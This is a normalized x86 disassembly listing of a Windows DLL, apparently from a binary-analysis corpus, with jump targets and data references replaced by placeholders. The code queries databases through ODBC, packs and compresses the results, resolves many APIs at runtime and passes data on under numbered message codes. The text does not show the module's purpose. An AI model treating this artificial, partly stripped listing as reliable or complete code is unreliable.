mov eax [ ecx + 0x8 ]
sub ebp eax
cmp ebp 0x4
jbe r-xdata
mov eax [ esp + 0x10 ]
push eax
call Ordinal_ODBC32_13
cmp ax 0xffff
je r-xdata
lea edx [ esp + 0x50 ]
lea eax [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x30 ]
push eax
lea edx [ esp + 0x3c ]
push ecx
lea eax [ esp + 0x48 ]
push edx
mov edx [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x68 ]
push 0x40
push ecx
push ebx
push edx
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x60 ] esi
mov [ esp + 0x58 ] esi
mov [ esp + 0x50 ] esi
mov [ esp + 0x54 ] esi
mov [ esp + 0x74 ] esi
call Ordinal_ODBC32_8
mov edx [ esp + 0x2c ]
cmp edx 0x10000
jbe r-xdata
mov [ edx ] esi
mov eax [ esp + 0x14 ]
movsx edi ax
inc ecx
add edx 0x4
cmp ecx edi
jle r-xdata
mov edi [ esp + 0x20 ]
cmp edi esi
je r-xdata
mov ecx [ ecx + 0x4 ]
push esi
push ebp
push eax
push ebp
push 0xa01d
call sub_10001f60
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x94 ]
push eax
push 0x200
lea edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x44 ]
lea eax [ esp + 0x50 ]
push edx
mov edx [ esp + 0x20 ]
push eax
push ecx
push edx
push 0x3
mov [ esp + 0x38 ] esi
mov [ esp + 0x3c ] esi
mov [ esp + 0xb4 ] 0x0
call Ordinal_ODBC32_36
mov ecx [ esp + 0x24 ]
lea eax [ esp + 0x94 ]
push eax
call sub_100097a0
cmp ax 0x64
je r-xdata
cmp ax 0xffff
je r-xdata
mov edx 0x10000
mov [ esp + 0x2c ] edx
mov edx [ esp + 0x10 ]
push edx
call Ordinal_ODBC32_61
test ax ax
je r-xdata
mov eax [ edi ]
cmp eax esi
je r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x28 ] esi
cmp ax si
jle r-xdata
cmp edx 0x1
jg r-xdata
mov ebx [ esp + 0x24 ]
mov edi 0x1
pop ebp
mov ecx [ esp + 0x20 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
add edi 0x4
jmp r-xdata
mov ebx [ esp + 0x20 ]
cmp edx 0x64
jle r-xdata
mov edx 0xa
jmp r-xdata
mov eax [ esp + 0xc ]
push eax
push 0x3
call Ordinal_ODBC32_31
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x284
retn 0x4
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x90 ]
push edx
call sub_100097a0
inc edi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov [ edx ] 0x0
mov eax [ esp + 0x14 ]
inc ecx
movsx edx ax
add ebx 0x4
cmp ecx edx
mov [ esp + 0x28 ] ecx
jl r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
xor esi esi
lea ebp [ ecx + ebp + 0x1 ]
lea edi [ esp + 0x54 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x54 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebp [ ecx + ebp + 0x1 ]
movsx ecx [ esp + 0x34 ]
mov [ ebp ] ecx
add ebp 0x4
mov [ ebp ] edx
add ebp 0x4
movsx edx [ esp + 0x30 ]
mov [ ebp ] edx
mov eax [ esp + 0x2c ]
add ebp 0x4
lea esi [ eax + 0x10 ]
push esi
call ??2@YAPAXI@Z
movsx ecx bx
mov edx eax
mov eax [ esp + 0x24 ]
mov edi edx
add esp 0x4
mov [ eax + ecx * 4 - 0x4 ] edx
mov ecx esi
mov ebx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx ebx
mov ebx [ esp + 0x28 ]
and ecx 0x3
[ edi ]
lea ecx [ esp + 0x40 ]
mov [ esp + 0x40 ] 0x0
push ecx
push esi
push edx
mov edx [ esp + 0x1c ]
push 0x1
push ebx
push edx
call Ordinal_ODBC32_4
cmp ax 0xffff
je r-xdata
mov edx 0x64
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x90 ]
push eax
push 0x200
lea edx [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4c ]
push edx
push eax
push edi
push ecx
push 0x3
mov [ esp + 0x34 ] esi
mov [ esp + 0x38 ] esi
mov [ esp + 0xb0 ] 0x0
call Ordinal_ODBC32_36
test ax ax
jne r-xdata
mov eax [ esp + 0x24 ]
mov edx [ ebx ]
mov ecx ebp
sub ecx [ eax + 0x8 ]
cmp ecx 0xff000
jge r-xdata
cmp ax si
jg r-xdata
xor esi esi
inc ebx
cmp bx [ esp + 0x14 ]
mov [ esp + 0x28 ] ebx
jle r-xdata
jmp r-xdata
xor esi esi
sub_100093a0
sub esp 0xc
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x20 ]
mov ebp ecx
push edi
mov [ esp + 0x1c ] ebp
call [ rw-data ]
mov ebx [ ebp + 0x8 ]
mov esi eax
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] 0x0
mov [ ebx ] esi
add ebx 0x4
test esi esi
jle r-xdata
push edi
call [ rw-data ]
test eax eax
je r-xdata
jmp r-xdata
push edi
call [ rw-data ]
mov eax [ ebp + 0x8 ]
sub ebx eax
cmp ebx 0x4
jbe r-xdata
test esi esi
jle r-xdata
mov eax [ esp + 0x10 ]
push eax
push edi
call [ rw-data ]
mov edx eax
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
mov ecx [ ebp + 0x4 ]
push 0x0
push ebx
push eax
push ebx
push 0xa01d
call sub_10001f60
push edi
call [ rw-data ]
test eax eax
jne r-xdata
mov edx eax
mov [ esp + 0x10 ] esi
push edi
call [ rw-data ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
mov ebp [ edx + 0x1c ]
cmp ebp 0x1
jg r-xdata
mov eax [ esp + 0x10 ]
add edx 0x4
dec eax
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax ebx
sub eax ecx
cmp eax 0xff000
jge r-xdata
cmp ebp 0x64
jle r-xdata
mov ebp 0xa
jmp r-xdata
mov edi [ edx ]
test edi edi
je r-xdata
mov edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov ebp [ esp + 0x18 ]
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ edx ]
or ecx 0xffffffff
[ edi ]
mov esi [ esp + 0x14 ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
mov edi [ edx ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ edx ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov eax [ esp + 0x10 ]
lea ebx [ ebx + ecx + 0x1 ]
mov ecx [ edx + 0x4c ]
mov [ ebx ] ecx
add ebx 0x4
mov ecx [ esp + 0x14 ]
mov [ ebx ] ebp
mov edx [ edx + 0x44 ]
add ebx 0x4
mov [ ebx ] edx
add ebx 0x4
inc eax
cmp eax ecx
mov [ esp + 0x10 ] eax
jl r-xdata
mov ebp 0x64
mov edi [ esp + 0x20 ]
mov ebp [ esp + 0x18 ]
mov edi [ esp + 0x20 ]
mov esi ecx
sub_10009530
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
mov ecx [ esi + 0xc ]
push ecx
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
push edx
jmp r-xdata
mov ecx [ esi + 0xc ]
push ecx
call [ rw-data ]
test eax eax
jne r-xdata
push eax
mov ecx esi
call sub_100093a0
jmp r-xdata
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov edx [ esi + 0xc ]
push edx
call [ rw-data ]
test eax eax
jne r-xdata
or eax 0xffffffff
pop esi
retn 0x4
push eax
mov ecx esi
call sub_100097a0
xor eax eax
pop esi
retn 0x4
jmp r-xdata
sub_100095b0
sub esp 0x14
push ebx
mov ebx [ esp + 0x1c ]
push ebp
push esi
mov esi ecx
push edi
test ebx ebx
mov [ esp + 0x20 ] esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x4
push ebx
call ??2@YAPAXI@Z
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
mov ecx ebx
xor eax eax
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
push ebp
[ edi ]
mov ecx [ esi + 0x4 ]
call sub_10001870
cmp eax ebx
jne r-xdata
push ebp
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov edi ebp
or ecx 0xffffffff
mov [ esp + 0x10 ] eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x28 ] eax
mov eax [ ecx + ebp + 0x1 ]
lea edx [ ecx + ebp + 0x1 ]
mov cl [ edx + 0x4 ]
add edx 0x4
mov [ esp + 0x18 ] cl
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x18 ]
inc edx
and eax 0xff
mov ebx eax
shr ebx 0x4
and eax 0x1
mov [ esi + 0x10 ] ebx
mov [ esp + 0x18 ] eax
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] edx
[ edi ]
not ecx
dec ecx
lea edx [ ecx + edx + 0x1 ]
mov [ esp + 0x28 ] edx
test ebx ebx
jne r-xdata
mov edx [ esp + 0x28 ]
mov ecx 0x4000
xor eax eax
mov edi esi
[ edi ]
mov [ esp + 0x14 ] eax
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x14 ]
lea ecx [ esi + 0x1 ]
push eax
mov eax [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push ebx
push edx
push ebp
mov ecx edi
call sub_10008b90
mov ebx eax
push 0x0
mov [ esi ] bl
mov eax [ esp + 0x18 ]
mov ecx [ edi + 0x4 ]
add eax 0x3
push eax
push esi
push 0x10000
push 0xa01a
call sub_10001f60
push ebp
call ??3@YAXPAX@Z
push esi
call ??3@YAXPAX@Z
mov ecx [ edi + 0x4 ]
add esp 0x8
call sub_10001990
test eax eax
jne r-xdata
push 0x10000
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ ecx + 0x18 ]
test eax eax
jne r-xdata
xor eax eax
pop edi
test ebx ebx
pop esi
pop ebp
sete al
pop ebx
add esp 0x14
retn 0x4
sub_10009720
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
mov ebp ecx
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
lea edi [ ebx + 0x2 ]
push edi
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov ecx edi
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
push esi
[ edi ]
mov ecx [ ebp + 0x4 ]
call sub_10001870
cmp eax ebx
jne r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ebp + 0x10 ]
push esi
test eax eax
mov ecx ebp
je r-xdata
call sub_10009530
call sub_10008f00
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_100097a0
push esi
mov esi [ esp + 0x8 ]
mov edx ecx
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
pop edi
pop esi
retn 0x4
push eax
push ecx
lea eax [ ecx + ecx + 0xa ]
mov ecx [ edx + 0x4 ]
push esi
push eax
push 0xa01c
call sub_10001f60
sub_100097e0
push esi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push edi
mov edi [ GetProcAddress@IAT ]
push rw-data
push esi
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
mov ecx [ rw-data ]
mov [ rw-data ] eax
test ecx ecx
pop edi
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov eax 0x1
pop esi
retn
sub_100099c0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10009a10
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10009ad0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10009b7a
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10009b7a
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10004210
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10009b7a
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10009b7a
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10009d40
sub esp 0x38
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x44 ]
push ebx
mov ebx [ esp + 0x44 ]
push esi
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x54 ]
mov [ esp + 0x14 ] edx
push 0x38
mov [ esp + 0xc ] eax
mov eax [ ebx ]
push rw-data
lea edx [ esp + 0x10 ]
push ecx
push edx
mov [ esp + 0x28 ] eax
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x40 ] 0x0
call sub_10009df0
add esp 0x10
test eax eax
jne r-xdata
pop esi
pop ebx
add esp 0x38
retn
lea eax [ esp + 0x8 ]
push 0x4
push eax
call sub_1000a0e0
mov esi eax
add esp 0x8
cmp esi 0x1
je r-xdata
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x8 ]
push eax
mov [ ebx ] edx
call sub_1000aa50
add esp 0x4
lea ecx [ esp + 0x8 ]
push ecx
call sub_1000aa50
add esp 0x4
mov eax 0xfffffffb
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebx
add esp 0x38
retn
sub_10009df0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push 0x0
push 0x8
push 0xf
push 0x8
push edx
push eax
call sub_10009e20
add esp 0x20
retn
sub_10009e20
mov eax [ esp + 0x1c ]
push ebx
xor edx edx
push ebp
push esi
cmp eax edx
push edi
mov ebp 0x1
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffa
pop ebx
retn
mov al [ eax ]
mov cl [ r--data ]
cmp al cl
jne r-xdata
cmp [ esp + 0x30 ] 0x38
jne r-xdata
mov edi [ esp + 0x14 ]
cmp edi edx
jne r-xdata
mov eax [ edi + 0x20 ]
mov [ edi + 0x18 ] edx
cmp eax edx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
cmp [ edi + 0x24 ] edx
jne r-xdata
mov [ edi + 0x20 ] sub_1000b8d0
mov [ edi + 0x28 ] edx
mov ecx [ esp + 0x18 ]
cmp ecx 0xffffffff
jne r-xdata
mov [ edi + 0x24 ] sub_1000b8f0
mov ebx [ esp + 0x20 ]
cmp ebx edx
jge r-xdata
mov [ esp + 0x18 ] 0x6
mov ecx [ esp + 0x18 ]
cmp ebx 0xf
jle r-xdata
xor ebp ebp
neg ebx
jmp r-xdata
mov eax [ esp + 0x24 ]
cmp eax 0x1
jl r-xdata
mov ebp 0x2
sub ebx 0x10
cmp eax 0x9
jg r-xdata
cmp [ esp + 0x1c ] 0x8
jne r-xdata
cmp ebx 0x8
jl r-xdata
cmp ebx 0xf
jg r-xdata
cmp ecx edx
jl r-xdata
cmp ecx 0x9
jg r-xdata
mov eax [ esp + 0x28 ]
cmp eax edx
jl r-xdata
cmp eax 0x4
jg r-xdata
cmp ebx 0x8
jne r-xdata
mov ecx [ edi + 0x28 ]
push 0x16c0
push 0x1
push ecx
call [ edi + 0x20 ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ebx 0x9
mov [ edi + 0x1c ] esi
mov [ esi + 0x18 ] ebp
mov [ esi + 0x30 ] ebx
mov ecx ebx
mov ebx [ esp + 0x24 ]
mov ebp 0x1
shl ebp cl
lea ecx [ ebx + 0x7 ]
mov eax 0x1
shl eax cl
mov [ esi + 0x50 ] ecx
add ecx 0x2
mov [ esi ] edi
mov [ esi + 0x1c ] 0x0
lea edx [ ebp - 0x1 ]
mov [ esi + 0x2c ] ebp
mov [ esi + 0x4c ] eax
dec eax
mov [ esi + 0x54 ] eax
mov eax 0xaaaaaaab
mov [ esi + 0x34 ] edx
mul ecx
shr edx 0x1
mov [ esi + 0x58 ] edx
mov eax [ edi + 0x28 ]
push 0x2
push ebp
push eax
call [ edi + 0x20 ]
mov ecx [ esi + 0x2c ]
mov [ esi + 0x38 ] eax
mov edx [ edi + 0x28 ]
push 0x2
push ecx
push edx
call [ edi + 0x20 ]
mov [ esi + 0x40 ] eax
mov eax [ esi + 0x4c ]
mov ecx [ edi + 0x28 ]
push 0x2
push eax
push ecx
call [ edi + 0x20 ]
mov [ esi + 0x44 ] eax
lea ecx [ ebx + 0x6 ]
mov eax 0x1
push 0x4
shl eax cl
mov [ esi + 0x169c ] eax
mov edx [ edi + 0x28 ]
push eax
push edx
call [ edi + 0x20 ]
mov ecx [ esi + 0x169c ]
add esp 0x30
mov [ esi + 0x8 ] eax
lea edx [ ecx * 4 ]
mov [ esi + 0xc ] edx
mov edx [ esi + 0x38 ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffc
pop ebx
retn
mov [ esi + 0x4 ] 0x29a
mov eax [ r--data ]
push edi
mov [ edi + 0x18 ] eax
call sub_1000aa50
add esp 0x4
mov eax 0xfffffffc
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x40 ]
test edx edx
je r-xdata
mov edx [ esi + 0x44 ]
test edx edx
je r-xdata
test eax eax
je r-xdata
mov edx ecx
push edi
shr edx 0x1
mov [ esi + 0x24 ] 0x8
lea edx [ eax + edx * 2 ]
lea eax [ eax + ecx * 2 ]
add ecx eax
mov [ esi + 0x16a4 ] edx
mov edx [ esp + 0x2c ]
mov [ esi + 0x1698 ] ecx
mov ecx [ esp + 0x1c ]
mov [ esi + 0x88 ] edx
mov [ esi + 0x84 ] ecx
call sub_1000a050
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1000a050
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor ebx ebx
cmp edi ebx
je r-xdata
pop edi
pop esi
mov eax 0xfffffffe
pop ebx
retn
mov esi [ edi + 0x1c ]
cmp esi ebx
je r-xdata
cmp [ edi + 0x20 ] ebx
je r-xdata
cmp [ edi + 0x24 ] ebx
je r-xdata
mov [ edi + 0x14 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0x18 ] ebx
mov [ edi + 0x2c ] 0x2
mov eax [ esi + 0x8 ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] eax
mov eax [ esi + 0x18 ]
cmp eax ebx
jge r-xdata
mov eax [ esi + 0x18 ]
push ebx
mov ecx eax
push ebx
neg ecx
sbb ecx ecx
push ebx
and ecx 0xffffffb9
add ecx 0x71
cmp eax 0x2
mov [ esi + 0x4 ] ecx
jne r-xdata
neg eax
mov [ esi + 0x18 ] eax
call sub_1000b900
call sub_1000d6f0
jmp r-xdata
add esp 0xc
mov [ edi + 0x30 ] eax
mov [ esi + 0x28 ] ebx
push esi
call sub_1000bb70
push esi
call sub_1000ab10
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_1000a0e0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
test ebp ebp
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
mov esi [ ebp + 0x1c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx 0x4
jg r-xdata
test ecx ecx
jl r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov edx [ r--data ]
mov [ ebp + 0x18 ] edx
cmp [ ebp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x29a
jne r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
cmp ecx 0x4
jne r-xdata
mov edx [ esi + 0x28 ]
cmp eax 0x2a
mov [ esi ] ebp
mov [ esp + 0x14 ] edx
mov [ esi + 0x28 ] ecx
mov ebx 0x2
jne r-xdata
mov eax [ r--data ]
pop edi
mov [ ebp + 0x18 ] eax
pop esi
pop ebp
mov eax 0xfffffffb
pop ebx
retn
cmp [ esi + 0x4 ] 0x45
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] 0x49
jne r-xdata
mov edx [ esi + 0x1c ]
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x30 ]
mov eax [ esi + 0x88 ]
shl ecx 0xc
sub ecx 0x7800
cmp eax ebx
jge r-xdata
push 0x0
push 0x0
push 0x0
call sub_1000d6f0
mov [ ebp + 0x30 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x14 ]
add esp 0xc
mov [ eax + ecx ] 0x1f
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc eax
mov [ esi + 0x14 ] eax
mov [ edx + eax ] 0x8b
mov edi [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
inc edi
mov eax edi
mov [ esi + 0x14 ] edi
mov [ ecx + eax ] 0x8
mov edx [ esi + 0x14 ]
mov eax [ esi + 0x1c ]
inc edx
test eax eax
mov [ esi + 0x14 ] edx
mov edi edx
jne r-xdata
cmp [ esi + 0x4 ] 0x5b
jne r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] 0x49
mov eax [ edx + 0x14 ]
mov edi [ esi + 0x20 ]
mov ecx [ esi + 0x14 ]
and eax 0xffff
cmp edi eax
jae r-xdata
xor eax eax
mov eax [ esi + 0x84 ]
cmp eax ebx
jl r-xdata
mov edx [ eax + 0x24 ]
mov ecx [ eax + 0x2c ]
neg edx
sbb dl dl
and edx 0x10
neg ecx
sbb cl cl
and ecx ebx
add dl cl
mov ecx [ eax + 0x1c ]
neg ecx
sbb cl cl
and ecx 0x8
add dl cl
mov ecx [ eax + 0x10 ]
neg ecx
sbb cl cl
and ecx 0x4
add dl cl
mov ecx [ eax ]
test ecx ecx
mov ecx [ esi + 0x8 ]
setne al
add dl al
mov [ ecx + edi ] dl
mov edi [ esi + 0x14 ]
mov edx [ esi + 0x1c ]
mov ecx [ esi + 0x8 ]
inc edi
mov [ esi + 0x14 ] edi
mov dl [ edx + 0x4 ]
